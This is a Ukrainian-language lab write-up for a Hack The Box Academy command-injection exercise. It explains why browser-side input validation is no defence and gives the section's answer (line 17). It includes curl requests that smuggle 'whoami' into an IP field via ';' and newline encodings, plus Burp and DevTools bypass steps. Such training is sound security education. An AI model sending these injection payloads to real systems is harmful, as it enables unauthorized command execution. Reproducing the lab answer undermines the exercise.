## Command Injections — Bypassing Front-End Validation

**Модуль:** [Command Injections](https://academy.hackthebox.com/app/module/109)
**Секція:** [Injecting Commands](https://academy.hackthebox.com/app/module/109/section/1033)
**Відповідь:** `17`

***

## Концепція

**Front-end validation** — перевірка яка виконується у браузері (JavaScript або HTML5 атрибути) **до** відправки на сервер. Це лише зручність для користувача, а **не безпека** — будь-хто може обійти її через curl або Burp Suite, надсилаючи запити напряму.

У цьому випадку HTML5 атрибут `pattern` на `<input>` дозволяє лише коректні IP-адреси. Сервер цю перевірку **не дублює** → вразливість.

***

## Як знайти рядок

```bash
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
TARGET="http://154.57.164.67:32497"

# cat -n нумерує рядки, grep знаходить HTML5 валідацію
curl -s "$TARGET/" | cat -n | grep -i "pattern\|validate\|onsubmit\|oninput"
```

**Вивід:**
```
17  <input type="text" name="ip" placeholder="127.0.0.1"
     pattern="^((\d{1,2}|1\d\d|2[0-4]\d|25[0-5])\.){3}(\d{1,2}|1\d\d|2[0-4]\d|25[0-5])$">
```

**Що означає `pattern`:**
```
^((\d{1,2}|1\d\d|2[0-4]\d|25[0-5])\.){3}   ← три октети з крапкою
(\d{1,2}|1\d\d|2[0-4]\d|25[0-5])$           ← четвертий октет
```
Regex дозволяє лише `0.0.0.0` – `255.255.255.255` → все інше браузер блокує.

***

## Як обійти (для наступного кроку)

**Метод A — curl** (минає браузер повністю):

```bash
# ; — semicolon оператор, виконує обидві команди
curl -s -X POST "$TARGET/index.php" \
  --data "ip=127.0.0.1%3b+whoami"

# %0a — newline оператор
curl -s -X POST "$TARGET/index.php" \
  --data "ip=127.0.0.1%0a+whoami"
```

**Метод B — Burp Suite:**
1. Proxy → Intercept ON
2. Відправляємо форму з валідним IP у браузері
3. Burp перехоплює → змінюємо `ip=127.0.0.1` на `ip=127.0.0.1;whoami`
4. Forward → сервер виконує

**Метод C — Browser DevTools:**
1. F12 → Inspector → знаходимо `<input ... pattern="...">`
2. Подвійний клік на `pattern` → видаляємо атрибут
3. Тепер форма приймає будь-який текст

***

## Відповідь

```
17
```
